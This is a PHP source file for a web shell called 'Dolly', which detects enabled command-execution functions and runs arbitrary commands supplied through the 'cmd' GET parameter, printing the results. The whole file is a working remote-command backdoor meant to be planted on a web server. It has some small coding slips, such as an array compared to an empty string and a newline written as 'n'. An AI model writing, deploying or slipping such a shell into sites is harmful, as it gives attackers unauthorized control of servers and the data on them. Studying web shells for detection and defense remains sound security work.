<?php
/*
 * PHP RCE SHELL - Dolly v1.0
 * @author: sinjap
 *
 * Dolly is a PHP shell that shows which PHP functions are available for executing commands.
 * This is useful when you are exploring environments.
 *
 * Supported functions: exec, shell_exec, system, passthru, eval
 *
 */

// Debugging local:
// $out = shell_spawn('who;id;pwd;');
// echo $out['output'];

function Dolly($cmd)
{
    $shell_functions = array("system", "exec", "shell_exec", "passthru", "eval");
    $enabled_functions = array_filter($shell_functions, 'function_exists');


    printEnabledFunctions($enabled_functions);
    if($enabled_functions !== "")
    {
        $status = 1; // RCE status set by default to not possible
        $php_shell = $enabled_functions[0]; // pick first shell method
        $output = "<h2>No luck, all supported functions are disabled thus RCE is not possible!</h2>"; // default

        echo "<h3>\nUsing $php_shell as shell cmd\n</h3>";
        if($php_shell == "system" || $php_shell == "passthru")
        {
            // disable multiple output
            ob_start();
            $output =  $php_shell($cmd, $status);
            ob_clean();
        }
        else if($php_shell == "exec")
        {
            $php_shell($cmd, $output, $status);
            $output = implode("n", $output);
        }
        else if($php_shell == "shell_exec")
        {
            $output = $php_shell($cmd);
        }
    }

    return array('output' => $output , 'status' => $status);
}

function printEnabledFunctions($enabled_functions)
{
    echo "<h2>Available Functions</h2>";
    echo "<ul>";
    foreach($enabled_functions as $f)
    {
        echo "<li>".$f."</li>";
    }
    echo "</ul>";
}

// HTTP GET
if(isset($_GET['cmd'])){
    $output = Dolly($_GET['cmd']);
    echo $output['output'];
}

?>